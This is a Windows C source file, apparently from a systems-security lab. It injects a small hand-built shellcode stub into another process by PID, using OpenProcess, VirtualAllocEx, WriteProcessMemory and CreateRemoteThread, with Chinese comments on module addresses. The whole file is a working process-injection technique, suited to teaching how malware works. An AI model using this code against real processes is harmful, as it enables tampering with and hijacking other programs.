#include <windows.h>
#include<stdio.h>
#include<string.h>
//int i;
BYTE code[]={0xe8,0x08,
             0xb8,0xbb,0xaa,0xbb,0xaa, //0xAABBAABB
             0xff,0xd0,
             0xc3,
             0xe8,0xf3,0xff,0xff,0xff,
             'm','s','g','.','d','l','l','\0'};
int main(int argc, char *argv[])
{
    int pid = 0;
    int exitcode=0;
    HANDLE hproc = 0;
    DWORD dwThreadId;
    PVOID pRemoteThread ;
    HANDLE  hThread	   = 0;
    int addr;
    char *s = "hacked";

    // YOU MAY NEED MORE LOCAL VARIABLES
    // PLEASE ADD THEM HERE
    int i;
    //hwllow.c中i的地址为004177E0
    if (argc < 2) {
        printf("Usage: %s pid\n", argv[0]);
        return -1;
    }
    pid = atoi(argv[1]);
    if (pid <= 0) {
        printf("[E]: pid must be positive (pid>0)!\n"); 
        return -2;
    }

    hproc = OpenProcess(PROCESS_CREATE_THREAD 
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION 
        | PROCESS_VM_WRITE 
        | PROCESS_VM_READ,
        FALSE, pid);
//msg.dll的基址是717c1000
//message的基址是717d1000
//WriteProcessMemory(hproc,0x717d1000,s,7,0);
//不同进程之间共享DLL的只读数据段，可写的数据段每个进程有单独一份
/*
_main:
  00000003: EB 08              jmp         0000000D
  00000005: B8 BB AA BB AA     mov         eax,0AABBAABBh
  0000000A: FF D0              call        eax
  0000000C: C3                 ret
  0000000D: E8 F3 FF FF FF     call        00000005
                               .string     "msg.dll"
 */
 addr= (int)GetModuleHandle;
 code[3]= (addr)     &255;
 code[4]= (addr>>8)  &255;
 code[5]= (addr>>16) &255;
 code[6]= (addr>>24) &255;
 
 printf("GetModuleHandle is :%08x\n",addr);
 pRemoteThread = VirtualAllocEx(hproc, NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

 WriteProcessMemory(hproc,pRemoteThread,code,sizeof(code),0);

printf("pRemoteThread is :%08x\n",pRemoteThread);
 hThread=CreateRemoteThread(hproc,0,0,pRemoteThread,pRemoteThread,0,&dwThreadId);

 //WaitForSingleObject(hThread, INFINITE);

 //GetExitCodeThread(hThread, (PDWORD) &exitcode);

 printf(">exitcode is 0x%08x\n",exitcode);

 //VirtualFreeEx(hproc, pRemoteThread, 0, MEM_RELEASE);
   
   
   
   
   
    if (!CloseHandle(hproc)) {
        printf("[E]: Process (%d) cannot be closed !\n", pid);
        return 2;
    };
    printf("[I]: Process (%d) is closed. \n", pid);
    return 0;
}